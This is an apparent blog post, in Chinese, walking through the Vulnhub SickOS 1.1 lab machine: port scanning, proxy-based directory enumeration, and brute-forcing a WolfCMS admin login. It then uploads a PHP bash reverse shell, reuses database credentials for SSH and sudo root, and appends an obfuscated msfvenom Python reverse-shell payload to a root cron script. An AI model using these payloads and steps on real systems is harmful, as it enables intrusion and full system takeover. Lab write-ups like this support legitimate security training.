{"pageProps":{"postData":{"id":"VulnhubSickOS 1 1","contentHtml":"<h1>SickOS 1.1</h1>\n<blockquote>\n<p><a href=\"https://www.vulnhub.com/entry/sickos-11,132/\">https://www.vulnhub.com/entry/sickos-11,132/</a></p>\n</blockquote>\n<h2>主机发现端口扫描</h2>\n<ol>\n<li>\n<p>探测存活主机，<code>136</code>是靶机，因为靶机是我最后添加的</p>\n<pre><code class=\"hljs language-php\">nmap -sP <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.0</span>/<span class=\"hljs-number\">24</span>\n<span class=\"hljs-comment\">//</span>\nStarting Nmap <span class=\"hljs-number\">7.93</span> ( https:<span class=\"hljs-comment\">//nmap.org ) at 2024-09-22 11:36 CST</span>\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.1</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.00038</span>s latency).\nMAC Address: <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">50</span>:<span class=\"hljs-number\">56</span>:C0:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">08</span> (VMware)\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.2</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.00031</span>s latency).\nMAC Address: <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">50</span>:<span class=\"hljs-number\">56</span>:FB:CA:<span class=\"hljs-number\">45</span> (VMware)\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.136</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.00049</span>s latency).\nMAC Address: <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">0</span>C:<span class=\"hljs-number\">29</span>:<span class=\"hljs-number\">62</span>:FB:<span class=\"hljs-number\">04</span> (VMware)\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.254</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.00027</span>s latency).\nMAC Address: <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">50</span>:<span class=\"hljs-number\">56</span>:F8:B3:<span class=\"hljs-number\">1</span>A (VMware)\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.131</span>\nHost is up.\n</code></pre>\n</li>\n<li>\n<p>扫描靶机所有开放端口</p>\n<pre><code class=\"hljs language-php\">nmap -sT -min-rate <span class=\"hljs-number\">10000</span> -p- <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.136</span> \n<span class=\"hljs-comment\">//</span>\nStarting Nmap <span class=\"hljs-number\">7.93</span> ( https:<span class=\"hljs-comment\">//nmap.org ) at 2024-09-22 11:41 CST</span>\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.136</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.00075</span>s latency).\nNot shown: <span class=\"hljs-number\">65532</span> filtered tcp <span class=\"hljs-title function_ invoke__\">ports</span> (no-response)\nPORT     STATE  SERVICE\n<span class=\"hljs-number\">22</span>/tcp   open   ssh\n<span class=\"hljs-number\">3128</span>/tcp open   squid-http\n<span class=\"hljs-number\">8080</span>/tcp closed http-proxy\nMAC Address: <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">0</span>C:<span class=\"hljs-number\">29</span>:<span class=\"hljs-number\">62</span>:FB:<span class=\"hljs-number\">04</span> (VMware)\n</code></pre>\n</li>\n<li>\n<p>查看服务版本以及系统版本</p>\n<pre><code class=\"hljs language-php\">nmap -sT -min-rate <span class=\"hljs-number\">10000</span> -p- <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.136</span> \n<span class=\"hljs-comment\">//</span>\nStarting Nmap <span class=\"hljs-number\">7.93</span> ( https:<span class=\"hljs-comment\">//nmap.org ) at 2024-09-22 11:41 CST</span>\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.136</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.00075</span>s latency).\nNot shown: <span class=\"hljs-number\">65532</span> filtered tcp <span class=\"hljs-title function_ invoke__\">ports</span> (no-response)\nPORT     STATE  SERVICE\n<span class=\"hljs-number\">22</span>/tcp   open   ssh\n<span class=\"hljs-number\">3128</span>/tcp open   squid-http\n<span class=\"hljs-number\">8080</span>/tcp closed http-proxy\nMAC Address: <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">0</span>C:<span class=\"hljs-number\">29</span>:<span class=\"hljs-number\">62</span>:FB:<span class=\"hljs-number\">04</span> (VMware)\n</code></pre>\n</li>\n<li>\n<p>使用脚本扫描漏洞</p>\n<pre><code class=\"hljs language-php\">nmap -script=vuln -p <span class=\"hljs-number\">22</span>,<span class=\"hljs-number\">3128</span>,<span class=\"hljs-number\">8080</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.136</span> -oA Desktop/test/vuln\n<span class=\"hljs-comment\">//</span>\nStarting Nmap <span class=\"hljs-number\">7.93</span> ( https:<span class=\"hljs-comment\">//nmap.org ) at 2024-09-22 11:46 CST</span>\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.136</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.00085</span>s latency).\n\nPORT     STATE  SERVICE\n<span class=\"hljs-number\">22</span>/tcp   open   ssh\n<span class=\"hljs-number\">3128</span>/tcp open   squid-http\n<span class=\"hljs-number\">8080</span>/tcp closed http-proxy\nMAC Address: <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">0</span>C:<span class=\"hljs-number\">29</span>:<span class=\"hljs-number\">62</span>:FB:<span class=\"hljs-number\">04</span> (VMware)\n</code></pre>\n</li>\n</ol>\n<h2>web渗透</h2>\n<ul>\n<li>\n<p>只有8080是关闭的，打开的只有<code>3128</code> 端口运行着squid代理服务和ssh，访问<code>3128</code> ，返回</p>\n<pre><code class=\"hljs language-php\">ERROR\nThe requested URL could not be retrieved\nThe following error was encountered <span class=\"hljs-keyword\">while</span> trying to retrieve the URL: /\n    Invalid URL\nSome aspect of the requested URL is incorrect.\nSome possible problems are:\n    Missing <span class=\"hljs-keyword\">or</span> incorrect access <span class=\"hljs-title function_ invoke__\">protocol</span> (should be <span class=\"hljs-string\">\"http://\"</span> <span class=\"hljs-keyword\">or</span> similar)\n    Missing hostname\n    Illegal <span class=\"hljs-keyword\">double</span>-escape in the URL-Path\n    Illegal character in hostname; underscores are not allowed.\nYour cache administrator is webmaster.\nGenerated Sun, <span class=\"hljs-number\">22</span> Sep <span class=\"hljs-number\">2024</span> <span class=\"hljs-number\">06</span>:<span class=\"hljs-number\">03</span>:<span class=\"hljs-number\">35</span> GMT by <span class=\"hljs-title function_ invoke__\">localhost</span> (squid/<span class=\"hljs-number\">3.1</span>.<span class=\"hljs-number\">19</span>)\n</code></pre>\n<p>可知版本是<code>3.1.19</code> ，因为他是个代理服务器，所以可能会代理着什么，可能就是<code>80</code>端口</p>\n</li>\n<li>\n<p>因为我的火狐连接着的是burp的代理地址，假如想要再通过代理访问别的网站并且能抓包的话，就需要设置burp上游代理服务器</p>\n<p>大概在：<code>network->connection->upstreamserver</code> 把代理地址<code>192.168.75.136:3128</code> 添加上去即可</p>\n</li>\n<li>\n<p>访问<code>192.168.75.136</code> ，页面有回显了，那就表示<code>80</code>在<code>192.168.75.136:3128</code> 下代理着</p>\n<pre><code class=\"hljs language-php\"><span class=\"hljs-comment\"># 内容</span>\nBLEHHH!!! \n</code></pre>\n<p>是个网路用词</p>\n</li>\n<li>\n<p>扫描目录，需要指定代理服务器</p>\n<pre><code class=\"hljs language-php\">python .\\dirsearch.py -u http:<span class=\"hljs-comment\">//192.168.75.136 --proxy 192.168.75.136:3128</span>\n<span class=\"hljs-comment\">//</span>\n[<span class=\"hljs-number\">12</span>:<span class=\"hljs-number\">15</span>:<span class=\"hljs-number\">18</span>] <span class=\"hljs-number\">403</span> -  <span class=\"hljs-number\">243</span>B  - /cgi-bin/\n[<span class=\"hljs-number\">12</span>:<span class=\"hljs-number\">15</span>:<span class=\"hljs-number\">19</span>] <span class=\"hljs-number\">200</span> -  <span class=\"hljs-number\">109</span>B  - /connect\n[<span class=\"hljs-number\">12</span>:<span class=\"hljs-number\">15</span>:<span class=\"hljs-number\">20</span>] <span class=\"hljs-number\">403</span> -  <span class=\"hljs-number\">239</span>B  - /doc/\n[<span class=\"hljs-number\">12</span>:<span class=\"hljs-number\">15</span>:<span class=\"hljs-number\">20</span>] <span class=\"hljs-number\">403</span> -  <span class=\"hljs-number\">242</span>B  - /doc/api/\n[<span class=\"hljs-number\">12</span>:<span class=\"hljs-number\">15</span>:<span class=\"hljs-number\">20</span>] <span class=\"hljs-number\">403</span> -  <span class=\"hljs-number\">247</span>B  - /doc/html/index.html\n[<span class=\"hljs-number\">12</span>:<span class=\"hljs-number\">15</span>:<span class=\"hljs-number\">20</span>] <span class=\"hljs-number\">403</span> -  <span class=\"hljs-number\">249</span>B  - /doc/en/changes.html\n[<span class=\"hljs-number\">12</span>:<span class=\"hljs-number\">15</span>:<span class=\"hljs-number\">20</span>] <span class=\"hljs-number\">403</span> -  <span class=\"hljs-number\">247</span>B  - /doc/stable.version\n[<span class=\"hljs-number\">12</span>:<span class=\"hljs-number\">15</span>:<span class=\"hljs-number\">29</span>] <span class=\"hljs-number\">200</span> -   <span class=\"hljs-number\">58</span>B  - /robots.txt\n[<span class=\"hljs-number\">12</span>:<span class=\"hljs-number\">15</span>:<span class=\"hljs-number\">30</span>] <span class=\"hljs-number\">403</span> -  <span class=\"hljs-number\">242</span>B  - /server-status\n[<span class=\"hljs-number\">12</span>:<span class=\"hljs-number\">15</span>:<span class=\"hljs-number\">30</span>] <span class=\"hljs-number\">403</span> -  <span class=\"hljs-number\">242</span>B  - /server-status/\n</code></pre>\n<p>发现<code>robots.txt</code>以及<code>connect</code></p>\n<ol>\n<li>\n<p><code>connect</code>内容</p>\n<pre><code class=\"hljs language-php\"><span class=\"hljs-comment\">#!/usr/bin/python</span>\n\n<span class=\"hljs-keyword\">print</span> <span class=\"hljs-string\">\"I Try to connect things very frequently\\n\"</span>\n<span class=\"hljs-keyword\">print</span> <span class=\"hljs-string\">\"You may want to try my services\"</span>\n</code></pre>\n</li>\n<li>\n<p><code>robots.txt</code> 内容</p>\n<pre><code class=\"hljs language-php\">User-agent: *\nDisallow: /\nDissalow: /wolfcms\n</code></pre>\n<p>给我们提示<code>wolfcms</code></p>\n</li>\n</ol>\n</li>\n<li>\n<p>访问<code>/wolfcms</code> ，是一个内容管理cms，爆破目录</p>\n<pre><code class=\"hljs language-php\">python .\\dirsearch.py -u http:<span class=\"hljs-comment\">//192.168.75.136/wolfcms --proxy 192.168.75.136:3128</span>\n<span class=\"hljs-comment\">//</span>\n[<span class=\"hljs-number\">12</span>:<span class=\"hljs-number\">18</span>:<span class=\"hljs-number\">17</span>] <span class=\"hljs-number\">200</span> -  <span class=\"hljs-number\">403</span>B  - /wolfcms/composer.json\n....\n[<span class=\"hljs-number\">12</span>:<span class=\"hljs-number\">18</span>:<span class=\"hljs-number\">17</span>] <span class=\"hljs-number\">200</span> -    <span class=\"hljs-number\">4</span>KB - /wolfcms/CONTRIBUTING.md\n[<span class=\"hljs-number\">12</span>:<span class=\"hljs-number\">18</span>:<span class=\"hljs-number\">18</span>] <span class=\"hljs-number\">301</span> -  <span class=\"hljs-number\">253</span>B  - /wolfcms/docs  ->  http:<span class=\"hljs-comment\">//192.168.75.136/wolfcms/docs/</span>\n[<span class=\"hljs-number\">12</span>:<span class=\"hljs-number\">18</span>:<span class=\"hljs-number\">18</span>] <span class=\"hljs-number\">200</span> -  <span class=\"hljs-number\">512</span>B  - /wolfcms/docs/\n[<span class=\"hljs-number\">12</span>:<span class=\"hljs-number\">18</span>:<span class=\"hljs-number\">18</span>] <span class=\"hljs-number\">200</span> -    <span class=\"hljs-number\">2</span>KB - /wolfcms/docs/updating.txt\n[<span class=\"hljs-number\">12</span>:<span class=\"hljs-number\">18</span>:<span class=\"hljs-number\">19</span>] <span class=\"hljs-number\">200</span> -  <span class=\"hljs-number\">894</span>B  - /wolfcms/favicon.ico\n[<span class=\"hljs-number\">12</span>:<span class=\"hljs-number\">18</span>:<span class=\"hljs-number\">26</span>] <span class=\"hljs-number\">301</span> -  <span class=\"hljs-number\">257</span>B  - /wolfcms/<span class=\"hljs-keyword\">public</span>  ->  http:<span class=\"hljs-comment\">//192.168.75.136/wolfcms/public/</span>\n[<span class=\"hljs-number\">12</span>:<span class=\"hljs-number\">18</span>:<span class=\"hljs-number\">26</span>] <span class=\"hljs-number\">200</span> -  <span class=\"hljs-number\">462</span>B  - /wolfcms/<span class=\"hljs-keyword\">public</span>/\n[<span class=\"hljs-number\">12</span>:<span class=\"hljs-number\">18</span>:<span class=\"hljs-number\">26</span>] <span class=\"hljs-number\">200</span> -    <span class=\"hljs-number\">2</span>KB - /wolfcms/README.md\n[<span class=\"hljs-number\">12</span>:<span class=\"hljs-number\">18</span>:<span class=\"hljs-number\">27</span>] <span class=\"hljs-number\">200</span> -   <span class=\"hljs-number\">20</span>B  - /wolfcms/robots.txt\n</code></pre>\n<p>发现<code>robots.txt</code>以及<code>readme.md</code></p>\n<p>访问后<code>robots.txt</code> 是空的，<code>readme.md</code> 为配置说明</p>\n</li>\n<li>\n<p>通过查阅得知后台登陆地址在<code>/wolfcms/?/admin/login</code></p>\n<p><img src=\"/post-images/VulnhubSickOS%201%201/image12.png\" alt=\"image.png\"></p>\n<p>网路搜索默认账号密码尝试，登陆失败</p>\n<p>使用burp进行爆破，指定账号为<code>admin</code> ，通过密码字典爆破</p>\n<p>爆破成功，账号密码都是 <code>admin</code></p>\n</li>\n</ul>\n<h2>获得初级shell</h2>\n<ul>\n<li>\n<p>登陆进去后寻找可利用点，找到 <code>uploadfile</code></p>\n<p>在 <code>file</code>→<code>Uploadfile</code></p>\n</li>\n<li>\n<p>上传反弹shell代码文件</p>\n<pre><code class=\"hljs language-php\"><span class=\"hljs-comment\">//getshell.php</span>\n<span class=\"hljs-meta\">&#x3C;?php</span> <span class=\"hljs-title function_ invoke__\">exec</span>(<span class=\"hljs-string\">\"/bin/bash -c 'bash -i >&#x26; /dev/tcp/192.168.75.131/1234 0>&#x26;1'\"</span>);<span class=\"hljs-meta\">?></span>\n</code></pre>\n</li>\n<li>\n<p>上传后点击文件，回显文件保存在 <code>/public/getshell.php</code></p>\n<p><img src=\"/post-images/VulnhubSickOS%201%201/image13.png\" alt=\"image.png\"></p>\n</li>\n<li>\n<p>一步一步尝试发现文件在 <code>http://192.168.75.136/wolfcms/public/getshell.php</code></p>\n<p><code>kali</code> 开启监听</p>\n<pre><code class=\"hljs language-php\">nc -lvp <span class=\"hljs-number\">1234</span>                                                     \nlistening on [any] <span class=\"hljs-number\">1234</span> ...\n</code></pre>\n<p>访问 <code>http://192.168.75.136/wolfcms/public/getshell.php</code></p>\n<p>反弹shell成功</p>\n</li>\n<li>\n<p>查看其权限</p>\n<pre><code class=\"hljs language-php\">listening on [any] <span class=\"hljs-number\">1234</span> ...\n<span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.136</span>: inverse host lookup failed: Unknown host\nconnect to [<span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.131</span>] <span class=\"hljs-keyword\">from</span> (UNKNOWN) [<span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.136</span>] <span class=\"hljs-number\">52339</span>\n<span class=\"hljs-comment\">//</span>\nwww-data@SickOs:/<span class=\"hljs-keyword\">var</span>/www/wolfcms/<span class=\"hljs-keyword\">public</span>$ dpkg -l\n...\n<span class=\"hljs-comment\">//</span>\nwww-data@SickOs:/<span class=\"hljs-keyword\">var</span>/www/wolfcms/<span class=\"hljs-keyword\">public</span>$ sudo -l\nsudo: no tty present <span class=\"hljs-keyword\">and</span> no askpass program specified\nSorry, <span class=\"hljs-keyword\">try</span> again.\nsudo: no tty present <span class=\"hljs-keyword\">and</span> no askpass program specified\nSorry, <span class=\"hljs-keyword\">try</span> again.\nsudo: no tty present <span class=\"hljs-keyword\">and</span> no askpass program specified\nSorry, <span class=\"hljs-keyword\">try</span> again.\nsudo: <span class=\"hljs-number\">3</span> incorrect password attempts\n<span class=\"hljs-comment\">//</span>\nwww-data@SickOs:/<span class=\"hljs-keyword\">var</span>/www/wolfcms/<span class=\"hljs-keyword\">public</span>$ uname -a\nLinux SickOs <span class=\"hljs-number\">3.11</span>.<span class=\"hljs-number\">0</span>-<span class=\"hljs-number\">15</span>-generic <span class=\"hljs-comment\">#25~precise1-Ubuntu SMP Thu Jan 30 17:42:40 UTC 2014 i686 i686 i386 GNU/Linux</span>\n</code></pre>\n<p>权限不高，系统名是<code>SickOs</code> 内核版本是<code>3.11.0-15</code></p>\n</li>\n</ul>\n<h2>提权</h2>\n<ul>\n<li>\n<p>因为wolf是cms，肯定会存在与数据库连接的文件，找到<code>config.php</code> 文件</p>\n<pre><code class=\"hljs language-php\">cat /<span class=\"hljs-keyword\">var</span>/www/wolfcms/config.php\n<span class=\"hljs-comment\">//</span>\n<span class=\"hljs-meta\">&#x3C;?php</span> \n\n<span class=\"hljs-comment\">// Database information:</span>\n<span class=\"hljs-comment\">// for SQLite, use sqlite:/tmp/wolf.db (SQLite 3)</span>\n<span class=\"hljs-comment\">// The path can only be absolute path or :memory:</span>\n<span class=\"hljs-comment\">// For more info look at: www.php.net/pdo</span>\n\n<span class=\"hljs-comment\">// Database settings:</span>\n<span class=\"hljs-title function_ invoke__\">define</span>(<span class=\"hljs-string\">'DB_DSN'</span>, <span class=\"hljs-string\">'mysql:dbname=wolf;host=localhost;port=3306'</span>);\n<span class=\"hljs-title function_ invoke__\">define</span>(<span class=\"hljs-string\">'DB_USER'</span>, <span class=\"hljs-string\">'root'</span>);\n<span class=\"hljs-title function_ invoke__\">define</span>(<span class=\"hljs-string\">'DB_PASS'</span>, <span class=\"hljs-string\">'john@123'</span>);\n<span class=\"hljs-title function_ invoke__\">define</span>(<span class=\"hljs-string\">'TABLE_PREFIX'</span>, <span class=\"hljs-string\">''</span>);\n.....\n</code></pre>\n<p>发现数据库用户名为<code>root</code>，密码为<code>john@123</code></p>\n<p>改密码有可能也是系统上某个用户的密码</p>\n</li>\n<li>\n<p>查看<code>/etc/passwd</code>  寻找可疑用户</p>\n<pre><code class=\"hljs language-php\">root:x:<span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">0</span>:root:/root:/bin/bash\ndaemon:x:<span class=\"hljs-number\">1</span>:<span class=\"hljs-number\">1</span>:daemon:/usr/sbin:/bin/sh\nbin:x:<span class=\"hljs-number\">2</span>:<span class=\"hljs-number\">2</span>:bin:/bin:/bin/sh\nsys:x:<span class=\"hljs-number\">3</span>:<span class=\"hljs-number\">3</span>:sys:/dev:/bin/sh\nsync:x:<span class=\"hljs-number\">4</span>:<span class=\"hljs-number\">65534</span>:sync:/bin:/bin/sync\ngames:x:<span class=\"hljs-number\">5</span>:<span class=\"hljs-number\">60</span>:games:/usr/games:/bin/sh\nman:x:<span class=\"hljs-number\">6</span>:<span class=\"hljs-number\">12</span>:man:/<span class=\"hljs-keyword\">var</span>/cache/man:/bin/sh\nlp:x:<span class=\"hljs-number\">7</span>:<span class=\"hljs-number\">7</span>:lp:/<span class=\"hljs-keyword\">var</span>/spool/lpd:/bin/sh\nmail:x:<span class=\"hljs-number\">8</span>:<span class=\"hljs-number\">8</span>:mail:/<span class=\"hljs-keyword\">var</span>/mail:/bin/sh\nnews:x:<span class=\"hljs-number\">9</span>:<span class=\"hljs-number\">9</span>:news:/<span class=\"hljs-keyword\">var</span>/spool/news:/bin/sh\nuucp:x:<span class=\"hljs-number\">10</span>:<span class=\"hljs-number\">10</span>:uucp:/<span class=\"hljs-keyword\">var</span>/spool/uucp:/bin/sh\nproxy:x:<span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">13</span>:proxy:/bin:/bin/sh\nwww-data:x:<span class=\"hljs-number\">33</span>:<span class=\"hljs-number\">33</span>:www-data:/<span class=\"hljs-keyword\">var</span>/www:/bin/sh\nbackup:x:<span class=\"hljs-number\">34</span>:<span class=\"hljs-number\">34</span>:backup:/<span class=\"hljs-keyword\">var</span>/backups:/bin/sh\n<span class=\"hljs-keyword\">list</span>:x:<span class=\"hljs-number\">38</span>:<span class=\"hljs-number\">38</span>:Mailing List Manager:/<span class=\"hljs-keyword\">var</span>/<span class=\"hljs-keyword\">list</span>:/bin/sh\nirc:x:<span class=\"hljs-number\">39</span>:<span class=\"hljs-number\">39</span>:ircd:/<span class=\"hljs-keyword\">var</span>/run/ircd:/bin/sh\ngnats:x:<span class=\"hljs-number\">41</span>:<span class=\"hljs-number\">41</span>:Gnats Bug-Reporting <span class=\"hljs-title function_ invoke__\">System</span> (admin):/<span class=\"hljs-keyword\">var</span>/lib/gnats:/bin/sh\nnobody:x:<span class=\"hljs-number\">65534</span>:<span class=\"hljs-number\">65534</span>:nobody:/nonexistent:/bin/sh\nlibuuid:x:<span class=\"hljs-number\">100</span>:<span class=\"hljs-number\">101</span>::/<span class=\"hljs-keyword\">var</span>/lib/libuuid:/bin/sh\nsyslog:x:<span class=\"hljs-number\">101</span>:<span class=\"hljs-number\">103</span>::/home/syslog:/bin/<span class=\"hljs-literal\">false</span>\nmessagebus:x:<span class=\"hljs-number\">102</span>:<span class=\"hljs-number\">105</span>::/<span class=\"hljs-keyword\">var</span>/run/dbus:/bin/<span class=\"hljs-literal\">false</span>\nwhoopsie:x:<span class=\"hljs-number\">103</span>:<span class=\"hljs-number\">106</span>::/nonexistent:/bin/<span class=\"hljs-literal\">false</span>\nlandscape:x:<span class=\"hljs-number\">104</span>:<span class=\"hljs-number\">109</span>::/<span class=\"hljs-keyword\">var</span>/lib/landscape:/bin/<span class=\"hljs-literal\">false</span>\nsshd:x:<span class=\"hljs-number\">105</span>:<span class=\"hljs-number\">65534</span>::/<span class=\"hljs-keyword\">var</span>/run/sshd:/usr/sbin/nologin\nsickos:x:<span class=\"hljs-number\">1000</span>:<span class=\"hljs-number\">1000</span>:sickos,,,:/home/sickos:/bin/bash\nmysql:x:<span class=\"hljs-number\">106</span>:<span class=\"hljs-number\">114</span>:MySQL Server,,,:/nonexistent:/bin/<span class=\"hljs-literal\">false</span>\n</code></pre>\n<p>发现可疑用户有 <code>root</code>，<code>www-data</code>，<code>bckup</code>，<code>sickos</code></p>\n</li>\n<li>\n<p>使用可疑用户进行ssh登录，密码使用<code>john@123</code> ，数据库链接上的密码</p>\n<p>最后<code>sickos</code> 成功登录</p>\n</li>\n<li>\n<p>查看<code>sickos</code> 用户权限</p>\n<pre><code class=\"hljs language-php\">sickos@SickOs:~$ sudo -l\n<span class=\"hljs-comment\">//</span>\n[sudo] password <span class=\"hljs-keyword\">for</span> sickos: \nMatching Defaults entries <span class=\"hljs-keyword\">for</span> sickos on this host:\n    env_reset, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\n\nUser sickos may run the following commands on this host:\n    (ALL : ALL) ALL\n</code></pre>\n<p>等于root权限</p>\n</li>\n<li>\n<p>读取flag</p>\n<pre><code class=\"hljs language-php\">sickos@SickOs:~$ sudo /bin/bash\nroot@SickOs:~<span class=\"hljs-comment\"># </span>\n<span class=\"hljs-comment\">//</span>\nroot@SickOs:/home<span class=\"hljs-comment\"># cd /root</span>\nroot@SickOs:/root<span class=\"hljs-comment\"># cat a0216ea4d51874464078c618298b1367.txt </span>\nIf you are viewing this!!\n\nROOT!\n\nYou have Succesfully completed SickOS1.<span class=\"hljs-number\">1</span>.\nThanks <span class=\"hljs-keyword\">for</span> Trying\n</code></pre>\n</li>\n</ul>\n<h2>另外一种提权思路</h2>\n<ol>\n<li>\n<p>查看定时任务<code>crontab</code> ，在<code>/etc/cron.d/</code> 里面存在一个<code>automate</code></p>\n<p>内容是</p>\n<pre><code class=\"hljs language-php\">www-data@SickOs:/etc/cron.d$ cat automate\n<span class=\"hljs-comment\">//</span>\n* * * * * root /usr/bin/python /<span class=\"hljs-keyword\">var</span>/www/connect.py\n</code></pre>\n<p>每分钟使用<code>root</code>执行<code>connect.py</code></p>\n</li>\n<li>\n<p>可以往<code>connect.py</code> 添加反弹<code>shell</code>代码</p>\n</li>\n<li>\n<p>生成<code>py</code>的<code>payload</code>代码</p>\n<pre><code class=\"hljs language-php\">msfvenom -p cmd/unix/reverse_python lhost=<span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.131</span> lport=<span class=\"hljs-number\">1235</span> -f raw\n<span class=\"hljs-comment\">//</span>\n[-] No platform was selected, choosing <span class=\"hljs-title class_\">Msf</span>::<span class=\"hljs-variable constant_\">Module</span>::<span class=\"hljs-variable constant_\">Platform</span>::<span class=\"hljs-variable constant_\">Unix</span> <span class=\"hljs-keyword\">from</span> the payload\n[-] No arch selected, selecting arch: cmd <span class=\"hljs-keyword\">from</span> the payload\nNo encoder specified, outputting raw payload\nPayload size: <span class=\"hljs-number\">364</span> bytes\npython -c <span class=\"hljs-string\">\"exec(__import__('zlib').decompress(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('eNqFkM0KwjAQhF8l5JSARJNSf5AcilQQUcH2XmyMtFib0E3fX0Paeuxehtn9dge2/ljTOQRGvbVDCC0Qgr60nVEaIHjz0z3yVRlwEvOdYHy9ZZuY8YjjcejvSC6ieGyADFdZEDK45Ficrmk+ZIVedjuciyy/p8mFTutMmbbVyhHicwPvQ+iEGGDP3goC7FU3ujWEBmo1S/BZQkyElf+PMPVoGoKXZd0uocL0C7l5Vrk=')[0])))\n</span></code></pre>\n<p>因为crontab执行的是python文件，所以不用exec再套一遍python，所以到的就有</p>\n<pre><code class=\"hljs language-php\"><span class=\"hljs-title function_ invoke__\">exec</span>(<span class=\"hljs-title function_ invoke__\">__import__</span>(<span class=\"hljs-string\">'zlib'</span>).<span class=\"hljs-title function_ invoke__\">decompress</span>(<span class=\"hljs-title function_ invoke__\">__import__</span>(<span class=\"hljs-string\">'base64'</span>).<span class=\"hljs-title function_ invoke__\">b64decode</span>(<span class=\"hljs-title function_ invoke__\">__import__</span>(<span class=\"hljs-string\">'codecs'</span>).<span class=\"hljs-title function_ invoke__\">getencoder</span>(<span class=\"hljs-string\">'utf-8'</span>)(<span class=\"hljs-string\">'eNqFkM0KwjAQhF8l5JSARJNSf5AcilQQUcH2XmyMtFib0E3fX0Paeuxehtn9dge2/ljTOQRGvbVDCC0Qgr60nVEaIHjz0z3yVRlwEvOdYHy9ZZuY8YjjcejvSC6ieGyADFdZEDK45Ficrmk+ZIVedjuciyy/p8mFTutMmbbVyhHicwPvQ+iEGGDP3goC7FU3ujWEBmo1S/BZQkyElf+PMPVoGoKXZd0uocL0C7l5Vrk='</span>)[<span class=\"hljs-number\">0</span>])))\n</code></pre>\n</li>\n<li>\n<p>把payload重定向到<code>connect.py</code> (<code>connect.py</code> 其实就是渗透阶段发现的<code>/connect</code> 目录里的内容)</p>\n<pre><code class=\"hljs language-php\"><span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">\"exec(__import__('zlib').decompress(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('eNqFkM0KwjAQhF8l5JSARJNSf5AcilQQUcH2XmyMtFib0E3fX0Paeuxehtn9dge2/ljTOQRGvbVDCC0Qgr60nVEaIHjz0z3yVRlwEvOdYHy9ZZuY8YjjcejvSC6ieGyADFdZEDK45Ficrmk+ZIVedjuciyy/p8mFTutMmbbVyhHicwPvQ+iEGGDP3goC7FU3ujWEBmo1S/BZQkyElf+PMPVoGoKXZd0uocL0C7l5Vrk=')[0])))\"</span> >> /<span class=\"hljs-keyword\">var</span>/www/connect.py\n</code></pre>\n</li>\n<li>\n<p>kali开启监听，等待代码执行</p>\n<p>获得<code>root</code>权限成功</p>\n<pre><code class=\"hljs language-php\">nc -lvp <span class=\"hljs-number\">1235</span>                                    \nlistening on [any] <span class=\"hljs-number\">1235</span> ...\n<span class=\"hljs-comment\">//</span>\n<span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.136</span>: inverse host lookup failed: Unknown host\nconnect to [<span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.131</span>] <span class=\"hljs-keyword\">from</span> (UNKNOWN) [<span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.136</span>] <span class=\"hljs-number\">51066</span>\n\npython -c <span class=\"hljs-string\">\"import pty;pty.spawn('/bin/bash')\"</span>\nroot@SickOs:~<span class=\"hljs-comment\"># </span>\n\n</code></pre>\n</li>\n</ol>","title":"Vulnhub - SickOS 1 1","date":"2025-04-02","updated":"2025-04-02","comments":true,"tags":["Vulnhub"],"categories":"靶机","description":"SickOS 1.1\n\n \n \n\n主机发现端口扫描\n\n1. 探测存活主机，`136`是靶机，因为靶机是我最后添加的\n    \n    \n    \n2. 扫描靶机所有开放端口 \n    \n    \n    \n3. 查看服务版本以及系统版本\n    \n    \n    \n4. 使用脚本扫描漏洞\n    \n    \n    \n\nweb渗透\n\n- 只有8080是关闭的，打开的只有`3128` 